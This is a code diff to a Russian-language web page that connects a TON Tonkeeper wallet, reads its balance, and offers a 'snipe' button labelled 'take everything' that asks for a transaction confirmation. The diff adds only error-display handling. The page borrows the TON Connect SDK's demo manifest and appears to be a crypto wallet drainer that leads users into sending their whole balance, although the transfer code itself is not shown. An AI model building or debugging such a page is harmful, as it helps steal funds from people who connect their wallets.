@@ -77,6 +77,18 @@
       width: 100%;
       cursor: pointer;
     }
+    .error-box {
+      background: #2a0a0a;
+      border: 1px solid #ff3333;
+      border-radius: 12px;
+      padding: 12px;
+      margin-top: 12px;
+      color: #ff6666;
+      font-size: 13px;
+      word-break: break-all;
+      display: none;
+    }
+    .error-box.show { display: block; }
   </style>
 </head>
 <body>
@@ -88,6 +100,8 @@
     <button class="btn btn-danger hidden" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
 
     <div id="status">⏳ Загрузка...</div>
+
+    <div class="error-box" id="errorBox"></div>
 
     <div class="confirm-box" id="confirmBox">
       <div class="title">✅ Подтвердите транзакцию в Tonkeeper</div>
@@ -109,9 +123,21 @@
       const balanceDisplay = document.getElementById('balanceDisplay');
       const confirmBox = document.getElementById('confirmBox');
       const openWalletBtn = document.getElementById('openWalletBtn');
+      const errorBox = document.getElementById('errorBox');
 
       let connector = null;
       let userAddress = null;
+
+      function showError(text) {
+        errorBox.textContent = '❌ ' + text;
+        errorBox.classList.add('show');
+        status.innerText = '❌ Ошибка';
+        console.error('ERROR:', text);
+      }
+
+      function hideError() {
+        errorBox.classList.remove('show');
+      }
 
       // ========== ИНИЦИАЛИЗАЦИЯ ==========
       function init() {
@@ -126,13 +152,11 @@
             manifestUrl: 'https://raw.githubusercontent.com/ton-connect/sdk/main/packages/sdk/demo/public/tonconnect-manifest.json'
           });
 
-          // Проверяем подключение
           if (connector.connected) {
             userAddress = connector.account.address;
             afterConnect();
           }
 
-          // Слушаем изменения
           connector.onStatusChange((wallet) => {
             if (wallet) {
               userAddress = wallet.account.address;
@@ -146,9 +170,10 @@
           });
 
           status.innerText = '🟢 Нажмите «Подключить»';
+          hideError();
 
         } catch (e) {
-          status.innerText = '❌ ' + e.message;
+          showError('Init: ' + e.message);
         }
       }
 
@@ -157,6 +182,7 @@
         connectBtn.classList.add('hidden');
         snipeBtn.classList.remove('hidden');
         updateBalance();
+        hideError();
       }
 
       // ========== БАЛАНС ==========
@@ -169,7 +195,8 @@
           const ton = (nano / 1e9).toFixed(2);
           balanceDisplay.innerText = `💰 ${ton} TON`;
           return nano;
-        } catch {
+        } catch (e) {
+          showError('Balance: ' + e.message);
           return 0;
         }
       }
@@ -177,6 +204,7 @@
       // ========== ПОДКЛЮЧИТЬ ==========
       connectBtn.onclick = async function() {
         try {
+          hideError();
           status.innerText = '⏳ Открываю Tonkeeper...';
           connectBtn.disabled = true;
 
@@ -187,7 +215,7 @@
           connectBtn.disabled = false;
 
         } catch (e) {
-          status.innerText = '❌ ' + (e.message || 'Ошибка');
+          showError('Connect: ' + (e.message || 'Ошибка'));
           connectBtn.disabled = false;
         }
       };
@@ -195,11 +223,12 @@
       // ========== ЗАБРАТЬ ВСЁ ==========
       snipeBtn.onclick = async function() {
         try {
+          hideError();
           status.innerText = '⏳ Проверка баланса...';
           snipeBtn.disabled = true;
 
           if (!connector || !connector.connected) {
-            status.innerText = '❌ Нет подключения';
+            showError('Нет подключения к кошельку');
             snipeBtn.disabled = false;
             return;
           }
@@ -240,10 +269,11 @@
             snipeBtn.innerText = '✅ ГОТОВО';
             snipeBtn.disabled = true;
             snipeBtn.className = 'btn btn-success';
+            hideError();
           }
 
         } catch (e) {
-          status.innerText = '❌ ' + (e.message || 'Ошибка');
+          showError('Snipe: ' + (e.message || 'Ошибка'));
           snipeBtn.disabled = false;
         }
       };
